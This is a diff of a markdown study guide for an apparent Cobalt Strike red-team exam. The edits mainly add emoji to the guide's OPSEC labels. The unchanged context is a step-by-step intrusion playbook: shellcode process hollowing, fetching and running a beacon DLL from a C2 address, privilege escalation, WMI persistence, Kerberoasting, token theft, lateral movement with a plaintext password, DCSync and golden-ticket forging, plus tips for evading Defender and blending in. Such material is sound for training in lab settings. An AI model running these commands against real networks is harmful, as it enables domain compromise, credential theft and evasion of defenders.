@@ -28,7 +28,7 @@ DNS listener:   (for elevated persistence — WMI)
 TCP-local:      Port 1337 (for SQL/isolated segments)
 ```
 
-**OPSEC-SAFE** — all profile setup; no target contact yet.
+**OPSEC-🟢SAFE** — all profile setup; no target contact yet.
 
 ---
 
@@ -76,7 +76,7 @@ ResumeThread(pi.hThread);  // resume → jumps straight into shellcode
 
 > **Why it matters for the exam:** The `ngentask.exe` Initial Access technique uses this principle — a legitimate .NET host loads your `AppDomainHijack.dll`, which allocates and executes beacon shellcode inside a suspended `msedge.exe`. The exam payload is pre-built; knowing this lets you adapt if it fails.
 
-**OPSEC note:** Step 3 is `OPSEC-CAUTION` — `CreateProcess(CREATE_SUSPENDED)` + `WriteProcessMemory` + `ResumeThread` in sequence is a known hollowing signature. Defender's memory scanner catches the shellcode if `stage.userwx true`. Mitigated by Artifact Kit + `userwx false`.
+**OPSEC note:** Step 3 is `OPSEC-🟠CAUTION` — `CreateProcess(CREATE_SUSPENDED)` + `WriteProcessMemory` + `ResumeThread` in sequence is a known hollowing signature. Defender's memory scanner catches the shellcode if `stage.userwx true`. Mitigated by Artifact Kit + `userwx false`.
 
 ---
 
@@ -186,7 +186,7 @@ C:\Tools\cobaltstrike\custom-resources\resources.cna
 **After first beacon checks in:**
 ```cs
 beacon> process_browser                            // GUI tab — check for EDR, find explorer PID, right-click → inject/steal_token
-beacon> ppid <explorer.exe PID>                    // OPSEC-SAFE — spoof parent
+beacon> ppid <explorer.exe PID>                    // OPSEC-🟢SAFE — spoof parent
 beacon> spawnto x64 %windir%\sysnative\werfault.exe
 ```
 
@@ -212,7 +212,7 @@ icacls C:\Windows\Tasks    # Authenticated Users:(RX,WD) — writable
 # Download beacon DLL from CS web server (IWR works in ConstrainedLanguage)
 Invoke-WebRequest -Uri 'http://10.0.0.5:80/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
 
-# Execute via rundll32 (OPSEC-CAUTION — EDR-visible but AppLocker compliant)
+# Execute via rundll32 (OPSEC-🟠CAUTION — EDR-visible but AppLocker compliant)
 rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ```
 
@@ -223,7 +223,7 @@ rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 Assume-breach: you have creds for the foothold workstation. No phishing needed on exam day.
 
 ```powershell
-# On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-SAFE)
+# On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-🟢SAFE)
 cd C:\Payloads\deals
 $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
 $env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
@@ -357,7 +357,7 @@ beacon> inline-execute [/path/to/file.o] [args]
 Exploit weak service registry permissions → SYSTEM beacon.
 
 ```cs
-// Enumerate services where low-priv users have FullControl (OPSEC-SAFE — powerpick)
+// Enumerate services where low-priv users have FullControl (OPSEC-🟢SAFE — powerpick)
 
 beacon> powerpick $lowpriv = @('Everyone','BUILTIN\Users','NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject]@{ServiceName=$_.PSChildName; Identity=$ace.IdentityReference.Value; Rights=$ace.RegistryRights}}}}
 
@@ -405,7 +405,7 @@ beacon> execute gpupdate /target:computer /force
 beacon> psinject [BEACON PID] x64 Remove-WmiPersistence
 ```
 
-**OPSEC-CAUTION** — WMI subscription creation logged; use generic names in the script (`Debug Trace`, `Debug Consumer`) to blend with legitimate WMI activity.
+**OPSEC-🟠CAUTION** — WMI subscription creation logged; use generic names in the script (`Debug Trace`, `Debug Consumer`) to blend with legitimate WMI activity.
 
 ---
 
@@ -414,7 +414,7 @@ beacon> psinject [BEACON PID] x64 Remove-WmiPersistence
 Target: dump credentials without touching LSASS directly. Prefer Rubeus/BOF over Mimikatz.
 
 ```cs
-// Kerberoasting — OPSEC-SAFE (in-memory, no LSASS touch)
+// Kerberoasting — OPSEC-🟢SAFE (in-memory, no LSASS touch)
 // First enumerate SPNs to avoid honeypot accounts
 beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
 
@@ -466,12 +466,12 @@ beacon> rev2self
 **Alternative — steal token from running process (preferred when process exists):**
 ```cs
 beacon> process_browser                               // find rsteel's process PID
-beacon> steal_token <pid>                             // OPSEC-SAFE — in-process token dupe
+beacon> steal_token <pid>                             // OPSEC-🟢SAFE — in-process token dupe
 ```
 
 ---
 
-## Phase 10 — Discovery (OPSEC-SAFE LDAP via BOF)
+## Phase 10 — Discovery (OPSEC-🟢SAFE LDAP via BOF)
 
 All `ldapsearch` commands run as BOFs — no child process, no disk write.
 
@@ -503,21 +503,21 @@ Use highest-OPSEC method that works. Impersonate before moving.
 // Test WinRM reachability first
 beacon> powerpick Test-WSMan lon-ws-1
 
-// Option 1 — WinRM (OPSEC-SAFE — preferred)
+// Option 1 — WinRM (OPSEC-🟢SAFE — preferred)
 beacon> make_token CONTOSO\rsteel Passw0rd!
 beacon> jump winrm64 lon-ws-1 smb
 
-// Option 2 — SCShell (OPSEC-CAUTION — no Event 7045, modifies existing service)
+// Option 2 — SCShell (OPSEC-🟠CAUTION — no Event 7045, modifies existing service)
 // CS > Script Manager > Load > C:\Tools\SCShell\CS-BOF\scshell.cna
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 beacon> make_token CONTOSO\rsteel Passw0rd!
 beacon> jump scshell64 lon-ws-1 smb
 
-// Option 3 — WMI (OPSEC-CAUTION — no service, no 7045)
+// Option 3 — WMI (OPSEC-🟠CAUTION — no service, no 7045)
 beacon> make_token CONTOSO\rsteel Passw0rd!
 beacon> remote-exec wmi lon-ws-1 C:\Windows\Temp\update.exe
 
-// Option 4 — psexec (OPSEC-UNSAFE — LAST RESORT — generates Event 7045)
+// Option 4 — psexec (OPSEC-🔴UNSAFE — LAST RESORT — generates Event 7045)
 beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
 beacon> make_token CONTOSO\rsteel Passw0rd!
 beacon> jump psexec64 lon-ws-1 smb
@@ -622,7 +622,7 @@ beacon> krb_s4u /ticket:[TGT] /service:host/<target> /impersonateuser:Administra
 ```cs
 // Load SQL-BOF: Cobalt Strike > Script Manager > Load > C:\Tools\SQL-BOF\SQL\SQL.cna
 
-// Enumerate SQL servers via LDAP SPN query (OPSEC-SAFE)
+// Enumerate SQL servers via LDAP SPN query (OPSEC-🟢SAFE)
 beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
 
 beacon> sql-info lon-db-1
@@ -722,7 +722,7 @@ beacon> ldapsearch (objectClass=domain) --hostname dub-dc-1 --dn DC=dublin,DC=co
 beacon> ldapsearch "(&(samAccountType=268435456)(samAccountName=Enterprise Admins))" --hostname lon-dc-1 --dn DC=contoso,DC=com --attributes objectSid
 
 // DCSync child domain krbtgt (from child DA beacon)
-beacon> dcsync dublin.contoso.com DUBLIN\krbtgt    // OPSEC-CAUTION — logged on DC
+beacon> dcsync dublin.contoso.com DUBLIN\krbtgt    // OPSEC-🟠CAUTION — logged on DC
 
 // Forge golden ticket with SID history → Enterprise Admins of parent
 C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:<child-SID> /sids:<parent-EA-SID> /aes256:<krbtgt-hash> /outfile:C:\Users\Attacker\Desktop\golden
@@ -786,9 +786,9 @@ beacon> ldapsearch (samAccountType=805306368) --hostname lon-dc-1 --dn DC=contos
 
 ```
 OPSEC TIERS:
-  SAFE:    inline-execute, ldapsearch, powerpick, steal_token, jump winrm64, krb_triage, krb_dump
-  CAUTION: execute-assembly, dcsync, make_token, sc_stop/start, sql-clr, kerberos_ticket_use
-  UNSAFE:  shell, powershell, run, jump psexec64, mimikatz direct
+  OPSEC-🟢SAFE:    inline-execute, ldapsearch, powerpick, steal_token, jump winrm64, krb_triage, krb_dump
+  OPSEC-🟠CAUTION: execute-assembly, dcsync, make_token, sc_stop/start, sql-clr, kerberos_ticket_use
+  OPSEC-🔴UNSAFE:  shell, powershell, run, jump psexec64, mimikatz direct
 
 SITUATIONAL AWARENESS:
   beacon> getuid | process_browser | ppid <PID> | spawnto x64 %windir%\sysnative\werfault.exe
@@ -802,9 +802,11 @@ CREDENTIAL HARVEST:
 LATERAL (preference order):
   jump winrm64 <target> smb  →  jump scshell64 <target> smb  →  remote-exec wmi  →  jump psexec64 (last resort)
 
-DCSYNC (CAUTION — logged on DC):
+DCSYNC (OPSEC-🟠CAUTION — logged on DC):
   beacon> dcsync CONTOSO\krbtgt
   beacon> dcsync CONTOSO\Administrator
+  ⚠️ Requires DA or replication rights. SYSTEM machine account (lon-wkstn-1$) will get
+     ERROR_DS_DRA_ACCESS_DENIED (0x000020f7). Must have DA beacon first.
 
 PERSISTENCE:
   User-level:   COM hijack HKCU → Teams DLL (Phase 4)
